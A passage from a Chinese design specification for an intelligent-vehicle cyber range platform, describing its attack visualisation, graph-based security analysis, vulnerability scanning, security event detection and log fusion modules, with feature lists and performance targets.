全视角和内部攻防安全视角两种视角，支持视角切换。其中，外部攻防安全视角默认以中国地图为地图，将检测到的实时基础攻击和复杂攻击，根据攻击源的IP归属地和靶标录入的位置信息在地图中采用飞线动画区分显示，并对攻击源目加入攻击和被攻击的动画效果。界面两侧对攻击数据进行统计分析展示，包括有效攻击占比，攻击趋势，队伍排名、受攻击排行等。另外，在地图右上角采用播报条实时呈现攻击数据。且可视化页面可持续运行7×24小时无卡顿。</p><p>界面右上角支持视角切换，内部攻防安全视角将试验获取的环境2D拓扑数据渲染为3D微观拓扑呈现，在大屏中心播放从攻击源到攻击目的的实时攻击数据。单击攻击线可在界面底部查看攻击的详细信息，包括攻击名称、攻击步骤、源IP、目的IP等。此外微观可视化的展示，还包括使用拓扑图、动画连线和图表等多种形式。在微观拓扑中，可以查看与汽车靶标节点相关的信息，包括域控制器、车机、网关、TBOX、车联网业务管理后台等不同类型的节点。这些节点的名称可以根据需要进行修改。且在拓扑图中可对拓扑的修改进行撤销、恢复等操作，可撤销操作最高支持十步。</p><h2 id="安全分析评估模块"><a href="#安全分析评估模块" class="headerlink" title="安全分析评估模块"></a>安全分析评估模块</h2><ul><li>支持图谱路径查询，可指定起始节点、目标节点、方向进行路径查询与展示，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/7520345467b4bc4c8cacb1e8787efaa8.png"></p><p>功能参数设计为，系统支持基于时间进行攻击统计分析，以热力图呈现攻击趋势。攻击者用户特征分析，目标分析，利用的漏洞分析，利用的工具分析。技术分析，包括复杂攻击链路和基础攻击信息。基于网络流量的基础安全指数计算评估，基于漏洞信息的脆弱安全指数评估，基于攻击行为的威胁安全指数评估。</p><p>综合安全指数评估。根据试验资产、漏洞、攻击数据生成试验统计分析报告。根据试验漏洞和攻击数据生成统计报告。用户自定义选择攻击数据进行图谱方式呈现，图谱筛选器管理，路径查询与展示，图谱统计分析展示，图谱快照管理，内容动态添加。不同图谱布局方式，图谱节点固定大小，边颜色设置，节点和边展示标签字段。图谱分析中两节点间不同边聚合展示。</p><p>基于试验任务生成试验数据统计信息及目录。用户按需进行试验数据提取查询，批量导出数据，脱敏算法处理导出数据，数据导出记录管理。</p><p>性能参数设计为，支持2000个节点的图谱分析展示。</p><h4 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h4><p>在智能汽车网络安全领域，对攻击事件的分析与统计是至关重要的。本系统旨在通过图谱分析技术，提供对攻击数据的深度分析与可视化展示，帮助安全分析师理解攻击者的行为特征、利用的工具和技术，以及攻击目标的脆弱性。系统将支持从数据提取到图谱的动态展示，以及从基础安全指数到综合安全指数的计算评估，为智能汽车网络安全防御提供有力的数据支持。</p><h4 id="功能-2"><a href="#功能-2" class="headerlink" title="功能"></a>功能</h4><p>攻击统计分析</p><p>时间基攻击统计：支持基于时间进行攻击统计分析，以热力图方式展示攻击趋势。</p><p>用户特征分析：支持攻击者的用户特征分析，包括设备浏览器特征等。</p><p>攻击目标分析：支持攻击者作用的目标分析，包括攻击利用路径、利用的端口、攻击应用等。</p><p>漏洞利用分析：支持攻击者利用的漏洞分析，包括漏洞编号、危险等级、漏洞描述。</p><p>工具利用分析：支持攻击者利用的工具分析，包括恶意文件MD5等。</p><p>技术分析：支持攻击者的技术分析，包括复杂攻击链路和基础攻击信息。</p><p>安全指数计算评估</p><p>基础安全指数：支持基于网络流量的基础安全指数计算评估。</p><p>脆弱安全指数：支持基于漏洞信息的脆弱安全指数计算评估。</p><p>威胁安全指数：支持基于攻击行为的威胁安全指数计算评估。</p><p>综合安全指数：支持基于三维安全指数的综合安全指数计算评估。</p><p>统计报告生成</p><p>试验统计报告：支持根据试验资产、漏洞、攻击数据生成试验统计分析报告。</p><p>漏洞与攻击报告：支持根据试验漏洞和攻击数据生成统计报告。</p><p>图谱分析与展示</p><p>图谱自定义展示：支持用户自定义选择攻击数据进行图谱展示。</p><p>图谱筛选管理：支持基于筛选器管理进行图谱筛选。</p><p>图谱路径查询：支持图谱路径查询与展示。</p><p>图谱统计分析：支持图谱统计分析与展示。</p><p>图谱快照管理：支持图谱快照管理。</p><p>图谱内容动态添加：支持图谱内容的动态添加。</p><p>图谱布局方式：支持不同的图谱布局方式。</p><p>图谱节点大小：支持图谱中的节点固定大小。</p><p>图谱边颜色设置：支持图谱中边的颜色设置。</p><p>图谱标签字段设置：支持设置展示的标签字段。</p><p>图谱边聚合展示：支持图谱边的聚合展示。</p><p>试验数据管理</p><p>试验数据统计目录：支持基于试验任务生成试验数据统计信息及目录。</p><p>试验数据提取查询：支持用户按需进行试验数据提取查询。</p><p>数据批量导出：支持用户选择数据类型批量导出。</p><p>数据脱敏处理：支持对导出数据进行脱敏处理。</p><p>数据导出记录管理：支持数据导出记录管理。</p><h4 id="性能-4"><a href="#性能-4" class="headerlink" title="性能"></a>性能</h4><p>图谱分析展示能力：支持2000个节点的图谱分析展示。</p><p>本系统提供了一个全面的智能汽车网络安全图谱分析与统计平台，能够帮助安全分析人员深入理解网络攻击的各个方面。通过系统的分析与评估，可以更好地指导智能汽车网络安全防御策略的制定与执行。系统的高性能设计确保了即使在大规模数据面前也能保持流畅的分析与展示能力。通过图谱的可视化展示，复杂的安全数据被转换为直观易懂的信息，极大地提高了安全事件的响应效率和准确性。</p><h3 id="方案简介-13"><a href="#方案简介-13" class="headerlink" title="方案简介"></a>方案简介</h3><p>安全分析评估模块基于攻击数据（基础攻击、复杂攻击、有效攻击数据）、防守成果数据、情报数据、网络流量数据，结合实验数据、资产数据、漏洞数据，使用规则配置、自主决策方式进行数据分析、对比分析、多维度分析，为确保数据的隐私和安全，该模块提供了数据脱敏功能，同时支持导出数据和记录导出历史。用户可以灵活地将分析结果导出，方便进一步深入研究、分享或归档分析成果。这一功能组合为用户提供了全面而灵活的数据分析与管理手段。同时为了审计管理，数据导出的信息涵盖了数据类型、导出时间、人员等。</p><p>该综合安全态势可视化模块还提供了深入的攻击者分析功能。它支持攻击者的用户特征分析，以帮助用户更好地理解攻击者的身份和特点，其中涵盖但不限于设备和浏览器特征等。同时，该模块还支持攻击者作用的目标分析，包括攻击的利用路径、利用的端口以及攻击应用等方面的信息，从而揭示攻击者的策略和目标。</p><p>此外，综合安全态势可视化模块还具备攻击者利用的漏洞分析功能，包括漏洞描述、危险等级、漏洞编号，有助于安全团队了解攻击者利用的漏洞情况。系统还提供对攻击者使用的工具进行深入分析，涵盖涉及恶意文件的MD5等详细信息。此外，系统还支持对攻击者的技术进行全面分析，涵盖基础攻击信息以及复杂攻击链路的细致解析。</p><p>最后，综合安全态势可视化模块可以通过攻击数据、试验资产、漏洞来产生试验统计分析报告，以及根据试验攻击数据、漏洞产生统计报告，这些报告可供防御方参考，用于系统加固和决策制定。这一系列分析功能有助于深入了解攻击事件的细节，提高网络安全的整体水平。</p><p>评估功能模块数据是基石，该模块支持基于网络流量的基础安全指数计算评估，基于漏洞信息的脆弱安全指数计算评估，以及基于攻击行为的威胁安全指数计算评估。最终，这些评估可以综合为基于基础、脆弱、威胁三维安全指数，为用户提供全面的安全评估。数据的收集包括入侵检测系统（IDS）和入侵防御系统（IPS）的日志、情报数据导入、网络流量数据、实验靶标数据、历史防守成功数据、操作系统数据和应用程序日志数据等。确保数据包括时间戳、源IP地址、目标IP地址、攻击类型、攻击方法等关键信息。</p><p>安全分析评估总体流程图如下所示:</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/66731fd3bb5e90f1a25002f01be85b25.png"></p><p>数据分析方法：</p><ul><li>攻击趋势分析：分析攻击数据的时间趋势，以确定是否存在季节性或周期性的攻击活动。</li><li>攻击来源和目标分析：确定攻击活动的来源和目标，以识别潜在的受攻击系统或网络。</li><li>攻击类型分析：分析不同类型的攻击，例如恶意软件传播、拒绝服务攻击、身份验证尝试等。</li><li>攻击向量分析：确定攻击者使用的攻击向量，例如恶意软件、漏洞利用等。</li><li>受害程度评估：评估攻击的受害程度，包括数据泄露、系统瘫痪、服务不可用等。</li></ul><p>通过分析攻击数据，识别潜在的漏洞或系统弱点，可能导致攻击成功。检查当前的安全策略和控制措施，以确定其有效性和完整性。分析数据可以帮助确定是否需要进一步改进策略。将外部的威胁情报信息、实验靶标数据、防守成功数据与分析结果结合，以提高评估的准确性和深度。这包括黑名单IP地址、已知攻击者情报、漏洞信息等。生成安全评估报告，包括当前的安全状况、发现的漏洞和威胁、建议的改进措施和风险评估。定期根据数据分析进行安全评估，以跟踪安全状况的变化，并根据新的威胁和漏洞不断生成新的评估报告与改进安全策略和控制措施。</p><p>1.数据支撑和存储模块元素：</p><p>数据支撑：该模块提供了与各种数据源连接的接口，包括防火墙、IDS/IPS、日志收集器、防守成果、实验靶标等。用户可以自定义选择攻击数据，其中涵盖了威胁数据、基础攻击数据、脆弱性数据、有效攻击数据、基础设施数据以及复杂攻击数据，以作为知识库库数据用于后续分析。</p><p>数据存储：安全评估模块需要一个存储系统，用于保存采集到的攻击数据以供后续分析。此存储系统还支持图谱内容的动态添加，可增量选择攻击数据添加到图谱中，并能够生成图谱快照，以管理数据的版本。</p><p>2.数据分析和挖掘模块元素：</p><p>攻击分析引擎：这个引擎允许用户可以自由选择攻击数据，并以图谱的形式进行展示，以便进行关联分析研究。它还支持图谱路径查询，用户可以通过选择方向、起始节点以及目标节点来执行路径展示以及查询。此外，它也可以执行图谱统计分析，包括节点出入度统计、关系数量以及节点数量。图谱可自由选择边的颜色，无论是相同颜色还是根据攻击复杂度而异的颜色都可以选择。此外，用户还能够在图谱的节点和边上添加自定义标签字段，以更好地传达关键信息。系统还提供了图谱分析功能，使用户能够将两个节点之间的多个不同边汇聚显示，以简化复杂关系的可视化，使数据更容易理解。在图谱展示中可展示最大可达2100个节点的图谱分析。</p><p>数据报表工具：生成图表、图形和仪表板，以可视化分析结果，同时可展示多种图谱布局，其中有流程图、力导、聚类以及同心圆布局等，以及节点能够通过数据变化大小来展示也可根据固定大小展示。</p><p>可视化列表工具：支持基于筛选器管理的图谱筛选，根据节点和边进行筛选，并生成列表查询，支持导出excel、脱敏、规则配置和生成导出记录。</p><p>统计分析工具：用于执行统计分析，如攻击趋势分析和攻击来源分析，以进一步加深对攻击数据的理解。</p><p>3.威胁情报整合模块元素：</p><p>威胁情报接口：该接口连接外部威胁情报源，如公共威胁情报提供商，用于获取最新的威胁情报数据，例如黑名单IP地址和已知漏洞。这些数据将用于更新数据支撑中的威胁数据。</p><p>威胁情报数据库：存储已知的威胁情报信息，如黑名单IP地址和已知漏洞，以供安全评估模块使用，用于识别威胁。</p><p>4.漏洞识别和脆弱性评估模块元素：</p><p>漏洞探测设备：用于扫描网络中的系统和应用程序，识别已知漏洞。扫描结果将与数据支撑中的漏洞知识数据库进行比对和更新。</p><p>漏洞知识数据库：存储已知漏洞的信息，以便与扫描结果进行比对和更新，以提供更全面的脆弱性评估。</p><p>5.安全评估报告生成模块元素：</p><p>报告生成引擎：利用数据支撑中的攻击数据、漏洞数据和威胁情报数据，生成安全评估报告，包括当前的安全状况、发现的漏洞和威胁、建议的改进措施和风险评估。报告也可以包括图谱方式呈现的分析结果。</p><p>报告模板：可基于试验任务定义报告的格式和内容，以满足用户的需求，包括试验数据统计信息和目录。用户还可以选择查询或选择数据类型并导出数据，采用批量导出方式以供进一步研究分析。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/d8bb165c3bac2dba40be12926f6da93f.png"></p><h2 id="资产漏洞探测模块"><a href="#资产漏洞探测模块" class="headerlink" title="资产漏洞探测模块"></a>资产漏洞探测模块</h2><ul><li>支持对探测设备进行条件查询，包括名称、IP、型号等模糊查询，需提供产品功能截图。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/2d3b4b31dfb87497f91a181efb77050e.jpeg" alt="39e1e3b8a49ac8b21d9a98706a77f122(1"></p><ul><li>支持对探测结果进行解析，生成资产IP、漏洞ID、漏洞分数、漏洞类型、漏洞描述等信息，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/f2ebea3140b7af72282bbfc179e6164f.png"></p><ul><li>可探测漏洞数量不低于30000个，需提供产品功能截图证明，截图中需有具体的漏洞数量并能清晰识别。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/ec1a3f365da0eb7e21cd97b995e26bcb.png"></p><p>功能参数设计为，系统支持对探测设备进行管理，探测设备信息管理。探测设备条件查询，接收试验探测指令解析。协同试验拓扑数据确定探测范围，生成探测任务。探测调度接收探测任务控制命令与配置信息。连接试验网络与分析网络，自动调度探测设备进行探测。探测完毕后将探测数据发送到探测数据管理模块，探测数据动态增量更新。靶场攻防对抗试验中多队伍私有场景探测加速优化。探测任务记录及状态监控。探测结果解析，探测数据适配，探测数据查看管理。探测数据条件查询，关联试验环境探测结果数据与知识库中资产漏洞知识。文件导入方式探测结果批量补全，文件导入结果监控。多选方式批量删除异常或错误数据。</p><p>性能参数设计为，可探测漏洞数量30000个，资产漏洞探测准确率90%。</p><h4 id="项目概述-1"><a href="#项目概述-1" class="headerlink" title="项目概述"></a>项目概述</h4><p>本项目旨在开发一套智能汽车网络安全探测设备管理系统，用于高效管理和调度探测设备，以及处理和分析探测数据。该系统将支持设备的基础管理、探测任务的生成与执行、探测数据的接收与解析，并确保探测活动的高效与准确性。通过此系统，用户可以轻松管理探测设备，快速响应试验需求，并将探测结果与知识库数据关联，以提高漏洞探测的准确率。</p><h4 id="功能-3"><a href="#功能-3" class="headerlink" title="功能"></a>功能</h4><p>探测设备管理</p><p>设备管理操作：支持对探测设备进行新增、修改、删除操作。</p><p>设备信息管理：支持对探测设备信息进行详细管理。</p><p>设备条件查询：支持对探测设备进行名称、IP、型号等模糊查询。</p><p>探测任务处理</p><p>试验探测指令解析：支持接收并解析试验探测指令。</p><p>探测范围确定：协同试验对应拓扑数据确定探测范围。</p><p>探测任务调度：支持探测任务的控制命令与配置信息处理。</p><p>网络连接与数据传输：支持同时连接试验网络与分析网络。</p><p>探测数据传输：支持探测数据的发送与动态增量更新。</p><p>探测效率优化</p><p>多队伍探测优化：支持靶场攻防试验中多队伍的探测加速优化。</p><p>探测任务监控：支持探测任务记录及状态监控。</p><p>探测数据解析与管理</p><p>探测结果解析：支持对探测结果数据进行详细解析。</p><p>探测数据适配：支持探测数据的标准化适配。</p><p>探测数据查看管理：支持探测数据的查看管理。</p><p>探测数据条件查询：支持对探测数据进行条件查询。</p><p>数据补全与融合</p><p>探测结果与知识库关联：支持关联试验环境探测结果与资产漏洞知识。</p><p>批量数据补全：支持文件导入方式进行探测结果批量补全。</p><p>文件导入监控：支持对文件导入结果进行监控。</p><p>异常数据批量删除：支持多选方式进行批量删除异常或错误数据。</p><h4 id="性能-5"><a href="#性能-5" class="headerlink" title="性能"></a>性能</h4><p>漏洞探测数量：可探测漏洞数量达到30000个。</p><p>探测准确率：资产漏洞探测准确率达到90%。</p><p>通过实施本方案，我们将提供一个全面的探测设备管理和数据处理平台，以支持智能汽车网络安全的漏洞探测工作。系统的设计考虑到了从设备管理到数据处理的全过程，确保了探测活动的高效性和准确性。此外，系统的优化措施将提高探测效率，减少冗余数据，提高数据分析的质量。通过本系统，用户可以实现对智能汽车网络安全态势的快速评估和响应。</p><h3 id="方案简介-14"><a href="#方案简介-14" class="headerlink" title="方案简介"></a>方案简介</h3><p>资产漏洞探测模块的目标是实现网络漏洞探测任务的高效管理与执行。它提供了一系列功能，包括探测设备管理，灵活的条件查询，以及探测任务的协同调度和数据管理。</p><p>资产安全漏洞探测旨在识别和修复组织资产（如服务器、网络设备、应用程序等）中的漏洞和弱点，以降低潜在的安全风险。资产探测设备首先会识别组织内部的所有资产，包括服务器、工作站、网络设备、应用程序、数据库等。一旦资产被识别，资产探测设备会对这些资产进行系统性的扫描，以检测已知漏洞和弱点。扫描可以基于已知的漏洞数据库（知识库）进行，将检测到的漏洞进行分类，根据漏洞的严重性和优先级进行评估。通常，漏洞被分为不同的级别（如高、中、低）以便能够优先处理最危险的漏洞。</p><p>首先，该模块允许用户对探测设备进行管理，包括设备的添加、修改和删除。用户可以维护关键设备信息，如访问信息、厂商、设备名称、端口、型号以及连接地址。此外，用户可以轻松地快速找到所需的设备信息，根据设备信息进行条件查询。</p><p>其次，系统支持接收试验探测指令并进行解析。它能够根据协同试验的拓扑数据确定探测范围，生成探测任务，并自动安排探测设备执行漏洞探测，且可探测漏洞数量至少为30000个，准确率不低于90%。系统能够同时连接试验网络和分析网络，智能地管理探测设备与试验之间的连接，确保探测任务的高效执行和结果的及时传输。</p><p>探测数据经过解析后，会被发送到探测数据管理模块，支持动态增量更新，同时还提供了优化靶场攻防对抗试验中多个队伍私有场景的探测速度，以提升效率。用户可以随时监控探测任务的记录和状态，涵盖了探测状态、任务类型以及试验名称。</p><p>一旦探测任务完成，系统支持对探测结果进行解析，生成关于资产IP、漏洞ID、漏洞分数、漏洞类型和漏洞描述的详细信息。探测数据可以按照统一的数据格式进行适配和管理，以便后续的数据查看和分析。用户可以以列表方式查看探测信息，并进行条件查询，以快速定位所需数据。此外，系统还能够关联试验环境的探测结果数据与知识库中的资产漏洞知识，实现信息的完整性。</p><p>对于探测结果的批量补全，用户可以选择使用文件导入方式。导入的数据将根据关键信息进行去重和融合处理，同时提供了监控功能，以便跟踪文件导入结果，包括成功导入数量、失败导入数量和详细的失败导入信息。</p><p>最后，用户还可以通过多选方式轻松批量删除异常或错误数据，以维护数据的质量和整洁性。</p><p>探测任务使用资产探测设备可进行自动化扫描，定期扫描网络和系统，以确保新的漏洞没有被引入，同时还能检测到已知漏洞的修复情况。</p><p>探测任务可生成详细的漏洞报告，包括发现的漏洞、漏洞的描述、影响级别、建议的修复措施以及漏洞的证据。这些报告帮助了解其漏洞情况与修复措施。</p><p>探测任务具有可配置性，可以根据具体的需求进行自定义，同时也能够关联实验结果数据与知识库知识漏洞进行系统集成，以实现自动化响应和修复。</p><p>资产安全漏洞探测由资产管理、探测设备管理、探测任务管理、探测数据管理组成，其组成示意图如下所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/53dc6f1cc5959082e743b9ed2dc07025.png"></p><p>1.探测设备管理：</p><p>提供设备的添加、修改和删除功能。</p><p>管理设备信息，包括名称、连接地址、端口、厂商、型号和访问信息。</p><p>2.探测任务调度：</p><p>解析试验探测指令并生成相应的探测任务。</p><p>支持协同试验对应拓扑数据的探测范围确定。</p><p>自动调度探测设备执行探测任务，包括开始、停止和探测范围的配置。</p><p>3.探测数据管理：</p><p>接收和存储探测完毕后的探测数据。</p><p>支持动态增量更新。</p><p>监控探测任务记录和状态，包括试验名称、任务类型和探测状态。</p><p>4.探测结果解析模块：</p><p>解析探测结果，生成漏洞描述、资产IP、漏洞类型、漏洞分数以及漏洞ID等信息。</p><p>对探测数据进行适配，统一数据格式。</p><p>5.探测数据查看和管理模块：</p><p>提供探测数据的列表查看和条件查询功能，包括资产IP、漏洞编号、漏洞类型等模糊条件搜索。</p><p>支持关联试验环境探测结果数据与知识库中的资产漏洞知识，进行信息补全。</p><p>6.文件导入和数据批量补全：</p><p>支持文件导入方式进行探测结果的批量补全。</p><p>导入数据基于关键信息进行去重和融合处理。</p><p>监控文件导入结果，包括成功导入数量、失败导入数量和失败导入的详细信息。</p><p>7.表单工具：</p><p>用于创建配置自定义表单，该表单支持对数据进行增改查、用于实现资产设备、资产扫描设备的自定义配置实现。</p><p>8.表格工具：</p><p>用于窗配置自定义列表，该表格支持基于数据自定义高级查询、excel导入导出、列表显示等。用于配置资产设备列表、资产扫描设备列表、探测数据列表、探索任务列表功能。</p><p>9.漏洞数据库：</p><p>资产探测设备使用漏洞数据库来比对已知的漏洞。这些数据库包含了各种已知漏洞的详细信息，包括漏洞描述、危害级别、受影响的软件版本等。</p><p>9.主动和被动扫描：</p><p>使用探测任务基于探测设备的安全漏洞扫描可以分为主动和被动两种方式。主动扫描是指主动地发送请求和测试系统以寻找漏洞。被动扫描则是监视系统的通信流量和行为，以检测潜在的问题。</p><p>10.自动化和手动审查：</p><p>使用探测任务基于探测设备的自动化漏洞扫描工具能够快速识别已知漏洞，但可能会产生误报或遗漏一些漏洞。因此，手动审查也是重要的，以深入检查系统，发现新的漏洞或特定于环境的问题。</p><p>11.定期扫描：</p><p>使用探测任务基于探测设备的安全漏洞扫描是一个持续性的过程，应该定期进行，以便捕获新的漏洞和确保已知漏洞已经修复。</p><h2 id="安全事件检测模块"><a href="#安全事件检测模块" class="headerlink" title="安全事件检测模块"></a>安全事件检测模块</h2><ul><li>支持流量抓包任务的控制操作，包括启动、停止、下载、删除，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/70b066d1bc4a2b590bd569cdd22ca57d.png"></p><p>功能参数设计为，系统支持接收汽车网络攻防流量数据进行安全事件检测分析。支持多种攻击检测，包括扫描探测、攻击突破、远程控制、窃取利用类型。最近一小时安全事件实时数据攻击类型统计、危害等级统计、攻击趋势统计和列表信息展示。安全事件详情查看，基于时间段筛选查看安全事件历史数据。安全检测事件外发，日志外发服务器配置。基于检测规则的靶向检测策略配置。接收攻击类型靶向检测策略指令，自动关联规则进行批量启用与停用。接收试验环境漏洞靶向采集策略指令。规则限权管理，规则查看与查询。基于规则包定期升级规则并展示升级记录。原始流量协议解析与大小分析。流量分析结果发送到大数据平台存储。流量分析结果管理与展示，流量分析结果统计分析。原始流量抓包分析，流量抓包任务控制操作。流量接收网络接口管理。</p><p>性能参数设计为，单个流量分析抓包任务文件大小200MB，关联漏洞信息的靶向检测规则20000条，系统内置安全事件检测规则40000条。</p><h3 id="方案简介-15"><a href="#方案简介-15" class="headerlink" title="方案简介"></a>方案简介</h3><p>安全事件检测依赖于对系统、网络流量用程序的实时监控。通过数据的监控，分析出各种安全事件，其中包括：</p><ol><li>漏洞扫描</li><li>TCP SYN扫描</li><li>端口扫描</li><li>路径遍历</li><li>资源泄漏暴露</li><li>缓冲区溢出</li><li>XSS攻击</li><li>暴力破解</li><li>文件下载</li><li>代码注入</li><li>命令注入</li><li>窃取利用</li></ol><p>安全事件检测整体框架如下图所示：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/c06195a49060af47cddbb74e71567e62.png"></p><p>使用外部威胁情报源的信息，可以帮助安全事件检测更好地识别已知的威胁指标，如恶意IP地址、已知攻击签名等。</p><p>安全事件检测使用事先定义的分析规则和检测规则来分析收集到的事件数据。这些规则可以基于模式匹配、异常检测、行为分析等技术。当检测到潜在威胁或异常行为时，系统应该能够生成实时警报，通知管理员采取适当的响应措施。</p><p>安全事件检测不仅仅是识别威胁，还包括采取措施应对它们。包括阻止攻击流量、隔离受影响系统、更新防御策略等。安全事件检测是一个不断改进的过程。通过分析事件和响应数据，可以识别攻击趋势和攻击模式，并不断优化检测规则和防御策略。</p><p>该模块支持接收汽车网络攻防流量数据，将其用于后续的安全事件检测和分析。这包括原始流量的捕获和存储，以及对流量数据进行协议解析和大小分析，以提供全面的网络情报。安全事件的实时统计和列表展示是模块的核心功能，提供攻击类型、危害等级和趋势分析，使安全团队能够快速识别并响应潜在威胁。用户可以查看每个安全事件的详细信息，包括时间、规则ID、源IP、目的IP、协议等，以便进行深入的调查和分析，并且支持对安全事件历史数据的筛选查看，以便了解攻击趋势和历史威胁情况，从而采取更有针对性的防御措施。该模块还提供规则管理功能，包括添加、修改、删除、查看、查询和升级规则，以确保安全策略的灵活性和实效性，并且支持系统内置安全事件检测规则至少为40000条。</p><p>该模块提供了安全事件外发功能，支持Syslog和Kafka两种形式的日志外发，以便与其他安全系统集成和协作。可以配置靶向检测策略，包括攻击类型和关联漏洞信息的靶向配置，支持关联漏洞信息的靶向检测规则至少20000条。</p><p>为了深入调查安全事件，模块支持原始流量抓包分析，包括任务创建和控制，以获取更多的网络细节，其中每一次进行流量抓包，所生成的文件最大可达到300MB。且管理流量接收的功能涵盖了速率、连接状态以及名称的监测和管理，以确保流量传输的可靠性。</p><p>数据源接口：安全事件检测模块需要与流量镜像接口连接，用于收集原始流量数据。</p><p>事件分析引擎：使用基于规则的事件分析引擎来检测异常或潜在的威胁。包括基于规则的检测、行为分析和模式匹配等技术。检查规则策略可自定义配置以适应检查过程、结果的优化和持续演进。</p><p>事件外发：使用基于非对称加密技术将安全事件数据加密共享外发到指定的服务器（消息中心、数据中心、知识库等），这些数据可用于其他信任系统、用户进行分析和同步。</p><p>实时警报生成：当检测到潜在威胁或异常事件时，安全事件检测模块应能够生成实时警报，以通知安全团队或管理员采取适当的行动。</p><h2 id="安全数据融合"><a href="#安全数据融合" class="headerlink" title="安全数据融合"></a>安全数据融合</h2><ul><li>支持通过文件上传、下载实现日志源设备的批量导入、批量导出，可快速、便捷地进行设备管理，需提供产品功能截图证明。</li></ul><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-cn-beijing.aliyuncs.com/media/4d8ae83c76467621de2a9fb89cb7339a.png"></p><p>功能参数设计为，系统支持日志源设备管理，设备信息管理。文件上传下载实现日志源设备批量导入导出。日志源设备日志解析测试。基于TCP和UDP的syslog方式和Kafka消息队列方式日志数据接入。接收安全事件检测产生的多源异构日志数据，进行数据汇聚、清洗与转发。接收汽车攻防演练场景安全日志，进行数据清洗、解析与融合。多源异构安全事件解析处理，转换为标准格式安全事件。快速零代码编程实现不同厂商设备日志数据解析。管理多种异构日志解析规则。新增日志解析规则管理，解析规则配置管理。基于正则表达式日志数据解析。解析日志字段与目标字段映射关系配置。基础攻击类型知识体系维护与管理。安全事件与攻击类型映射关系维护。基于设备型号关系维护，关键词分类方式安全事件组织。关键词与基础攻击类型映射关系维护。基于试验任务拓扑信息等，进行虚拟局域网与网络IP地址关系抽取与管理。基于融合生成基础攻击数据中VLAN和IP地址，自动关联应用试验任务。</p><p>性能参数设计为，支持国内主流安全厂商检测设备产品日志收集、转换、解析、融合，覆盖类型20种，融合生成基础攻击性能5000条/秒，融合安全事件类型50000种。</p><h4 id="项目背景-1"><a href="#项目背景-1" class="headerlink" title="项目背景"></a>项目背景</h4><p>随着智能汽车网络的复杂性增加，对网络攻防活动的监控与分析变得越来越重要。本系统旨在实现对智能汽车网络中的安全事件进行实时检测与分析，能够处理各类攻击类型，并通过流量分析提供深入的网络安全态势感知。系统将支持事件检测、流量抓包、协议解析、安全事件外发等功能，确保网络安全防护的及时性和有效性。</p><h4 id="功能-4"><a href="#功能-4" class="headerlink" title="功能"></a>功能</h4><p>安全事件检测分析</p><p>攻防流量数据接收：支持接收汽车网络攻防流量数据进行安全事件检测分析。</p><p>攻击类型检测：支持扫描探测、攻击突破、远程控制、窃取利用类型攻击检测。</p><p>攻击检测细分：支持具体攻击类型的详细检测。</p><p>实时安全事件统计：支持最近一小时安全事件实时数据的统计与展示。</p><p>安全事件详情查看：支持查看安全事件的详细信息。</p><p>安全事件历史数据查看：支持基于时间段筛选查看安全事件历史数据。</p><p>安全检测事件外发：支持安全检测事件的外发。</p><p>检测策略与规则管理</p><p>靶向检测策略配置：支持基于检测规则的靶向检测策略配置。</p><p>靶向检测策略执行：支持接收系统下发的靶向检测策略指令。</p><p>规则限权管理：支持对检测规则的权限管理。</p><p>规则查看与查询：支持规则的查看与查询。</p><p>规则包升级：支持基于规则包的定期升级。</p><p>流量分析与管理</p><p>原始流量协议解析：支持对原始流量进行协议解析。</p><p>流量分析结果管理：支持对流量分析结果进行管理与展示。</p><p>流量统计分析：支持对流量分析结果进行统计分析。</p><p>流量抓包分析：支持进行原始流量抓包分析。</p><p>流量抓包任务管理：支持流量抓包任务的控制操作。</p><p>流量接收网络接口管理：支持流量接收网络接口的管理。</p><h4 id="性能-6"><a href="#性能-6" class="headerlink" title="性能"></a>性能</h4><p>流量抓包任务文件大小：支持单个流量分析抓包任务文件大小为200MB。</p><p>靶向检测规则数量：支持关联漏洞信息的靶向检测规则20000条。</p><p>内置安全事件检测规则数量：支持系统内置安全事件检测规则40000条。</p><p>本系统为智能汽车网络安全提供了一个全面的事件检测与流量分析解决方案。通过实时监控和分析网络流量，系统能够及时发现并响应各类安全事件，同时提供详细的事件信息和历史数据查看功能。系统的外发功能能够将重要事件信息及时传递到其他安全系统中，确保安全防护的连贯性。此外，系统支持的靶向检测策略和规则管理功能，使得安全防护更加灵活和精确。通过高性能的流量分析和抓包功能，系统能够处理大规模的数据，满足智能汽车网络安全监控的需求。</p><h3 id="方案简介-16"><a href="#方案简介-16" class="headerlink" 